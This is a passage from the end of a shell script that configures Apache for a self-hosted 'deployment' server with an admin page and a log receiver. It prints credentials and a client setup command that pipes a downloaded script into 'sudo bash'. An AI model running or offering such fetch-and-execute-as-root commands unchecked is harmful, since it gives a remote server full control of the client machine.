sudo chmod 640 "$SERVER_ROOT/admin.php"
sudo chmod 640 "$SERVER_ROOT/log_receiver.php"

# Configure Apache
cat > /tmp/deployment.conf << EOF
<VirtualHost *:80>
    ServerName ${SERVER_IP}
    ServerAdmin webmaster@localhost
    DocumentRoot "/srv/http"
    DirectoryIndex index.html
    
    <Directory "/srv/http/deployment">
        Options -Indexes +FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
    
    <Directory "/srv/http/deployment/logs">
        Require all denied
    </Directory>
    
    <Directory "/srv/http/deployment/secrets">
        Require all denied
    </Directory>
    
    ErrorLog "/var/log/httpd/deployment-error.log"
    CustomLog "/var/log/httpd/deployment-access.log" combined
</VirtualHost>
EOF

sudo mv /tmp/deployment.conf /etc/httpd/conf/extra/deployment.conf

# Include our config in the main httpd.conf
if ! grep -q "Include conf/extra/deployment.conf" /etc/httpd/conf/httpd.conf; then
    echo "Include conf/extra/deployment.conf" | sudo tee -a /etc/httpd/conf/httpd.conf > /dev/null
fi

# Enable and restart Apache
sudo systemctl enable httpd
sudo systemctl restart httpd

echo "=============================================================="
echo "Deployment server setup complete!"
echo "=============================================================="
echo "Server URL: http://$SERVER_IP/deployment"
echo "Admin Page: http://$SERVER_IP/deployment/admin.php"
echo "Admin Password: $ADMIN_PASSWORD"
echo "Client Setup Command: wget -q -O- http://$SERVER_IP/deployment/client_setup.sh | sudo bash"
echo "=============================================================="
echo "Secret Token for accessing logs: $RANDOM_TOKEN"
echo "=============================================================="
